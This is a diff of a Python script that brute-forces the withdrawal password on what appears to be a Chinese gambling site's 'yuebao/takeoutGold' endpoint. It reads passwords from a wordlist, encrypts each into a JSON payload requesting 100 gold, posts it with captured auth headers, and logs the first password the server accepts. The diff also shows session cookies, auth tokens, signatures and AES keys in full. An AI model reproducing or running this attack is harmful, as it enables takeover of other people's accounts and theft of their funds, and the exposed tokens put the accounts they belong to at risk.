@@ -1,3 +1,5 @@
+import json
+
 import requests
 import base64
 import hashlib
@@ -60,45 +62,37 @@ class DeAesCrypt:
             return "不存在此种数据填充方式"
 
 
-cookies = {
-    'session_sslproxy_server': 'c8b0f2da-77e3-4f05e699d5913eb4aeef7dc31a14acd84bbc',
-    'UserKey': 'povwEaSHnAXR3qwBL6FIyebuXEwjsOXyw9fHuoIoY1ai7TQr3-srLVGdOz6CEmMU',
-    '_vid_t': '+IFdqGv/k9g+N4uKOWlnRajYlYNaxcIl72dkfDFXwlJZ5LS4nM/XSm+Oct83GD34sNA/txKf2x9slA==',
-}
-
 headers = {
-    'authority': 'www.4424477.com',
+    'authority': 'web.1543434.com',
     'accept': 'application/json, text/plain, */*',
     'accept-language': 'zh',
-    'auth': 'GlujAuANnovQpQOSUQcFtqc769ivyZ1B_Yq1quUxNge7205tY0oOgvMeqMcu70UKSU4tnZVgMMKUFa7kfRjsH4OHVGd8Mkb4g5OmdQDmr01ZV57siUIlpFl8mc2k1CECw8jfpfJFlkIft_XdNDarbud2Shadp4i4q926U4tkSsI0RA-pjgS-MZZ1OYCNRoGvcqg2vDhlGtUb7AWr-PSIRuvaqOYpE-XmgUyfj6MmS5Yx0iaCckWsusxCthDObzVYteoswyb7wBn-POBf-PYdsxKh8CO2zTLSrYXXtlAH8fjohmwnk2QaXbSlV6QhmI5ZEV_wDjm-HlX1T0wO6w8CuQ',
+    'auth': 'aCgn8eCIPqN_D2IwNHH0GGxUi-g6aJhQkWfQim2Fe9lNA1IX0Rr7J_3F4PlF0baUwBsRG4XwfNbCbG50V1Bt6dSrOD3dhFTO1e31iMMI7fFEjLNVoRJ_9F4lpa8HDc08NuQ0do7_yg-CfkjcrZIGui4QCyC3hU4thhCPSg59L4ql0lz4PF6nGNrR6pAaz3WJMmKbtAOI6ItR23KmRRpUvs1oZGSepfLg0G0kjTNksyPd5DF8HNLSyzHjnQ361fGhv7VtAecI9slnpUt-NxXWO3U55rEOHJ3lpp1LCJOdwmDvRDFZpINrb_ch_ztkX2BcghTSPq_TB9y2bGEEBkouNg',
     'browserfingerid': 'SWZS2wpfkd0K8ySSUbaa',
     'clienttimezone': 'UTC+8',
     'content-type': 'text/plain',
-    # 'cookie': 'session_sslproxy_server=c8b0f2da-77e3-4f05e699d5913eb4aeef7dc31a14acd84bbc; UserKey=povwEaSHnAXR3qwBL6FIyebuXEwjsOXyw9fHuoIoY1ai7TQr3-srLVGdOz6CEmMU; _vid_t=+IFdqGv/k9g+N4uKOWlnRajYlYNaxcIl72dkfDFXwlJZ5LS4nM/XSm+Oct83GD34sNA/txKf2x9slA==',
     'currency': 'CNY',
-    'data-uuid': 'data-uuid-41',
+    'data-uuid': 'data-uuid-108',
     'device': '657c402a-39cf-47ad-bc30-eb96fbcae2b6',
     'devicemodel': 'windows',
     'domain': 'www.4424477.com',
     'language': 'zh',
-    'nonce': '99177925-44b9-4946-b2b1-0c165c051ed8',
+    'nonce': 'efa7a767-6dfa-4766-8fc8-293b806dc54a',
     'origin': 'https://www.4424477.com',
     'platformtype': '5',
-    'referer': 'https://www.4424477.com/home/yuebao?id=18538137',
+    'referer': 'https://www.4424477.com/',
     'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'sign': 'tizCVGKpjENPFVZX6hx3MWr4EbYEPfkMGIBGX9/lsUDTkrnmHExurBb75X+nbxn/',
+    'sec-fetch-site': 'cross-site',
+    'sign': 'P0aEOjzNVZfYuUULR09ilUWs/wcaXf3XrkJ/a774hBJnpNmbMaPqKPV+SeA/plvJ',
     'sitecode': '128',
-    'timestamp': '1679234551',
-    'token': '811c734efc0e9bdb97f41679234540806740774',
+    'timestamp': '1679244806',
+    'token': '65bec38febe6e7c1bc891679244545158442938',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
-    'x-request-id': '99177925-44b9-4946-b2b1-0c165c051ed8',
+    'x-request-id': 'efa7a767-6dfa-4766-8fc8-293b806dc54a',
 }
-
 # data = 'EnySdAsslemHSkmy5lP5GXc3eR8xDjGE9sGijAjnG1jaIMmZK71OoqeOrrN3exwhXIL1YkAZF1iJ0GXlRufwSg=='
 
 # response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies, headers=headers, data=data)
@@ -106,28 +100,34 @@ headers = {
 if __name__ == '__main__':
     data = 'EnySdAsslemHSkmy5lP5GXc3eR8xDjGE9sGijAjnG1jaIMmZK71OoqeOrrN3exwhXIL1YkAZF1iJ0GXlRufwSg=='
     # key = "8325b1d23ff2eeb4"
-    key = "6ac7977dbcc1d526"
+    key = "1f0d57575449c824"
     iv = "5421698523412578"
     aes_obj = DeAesCrypt(key, iv)
     # ddd = aes_obj.decrypt_aes(data)
     with open("pass.txt", "r") as f:
         i = 0
         for content in f.readlines():
+            # print(content)
             try:
-                i += 1
-                data = aes_obj.encyrpt_aes(content)
-                response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,
-                                         headers=headers, data=data)
+                # i += 1
+                origin_data = json.dumps({"accessGold": 100, "passwd": content, "time": int(time.time())})
+                data = aes_obj.encyrpt_aes(origin_data)
+                # response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,headers=headers, data=data)
+                response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold',headers=headers, data=data)
                 res = response.json()
-                if i == 10000:
-                    print("到哪了:", i, data, content)
-                if "密码不正确" == res.get("msg") or res.get("errorCode") == 41080:
-                    continue
+                # if i == 10000:
+                #     print("到哪了:", i, data, origin_data)
+                if "密码不正确" == res.get("msg"):
+                    print(res,origin_data, data)
+                    pass
                 else:
-                    print(content, res, data)
+                    print(res, origin_data, data)
+                    with open("corr.txt","a") as f:
+                       f.write(str(res)+origin_data)
                     break
 
             except Exception as e:
-                print(str(e), "到那了:", content, data)
+                print(str(e), "到那了:", res, origin_data, data)
                 time.sleep(10)
+                # 报错继续继续本次循环
                 continue
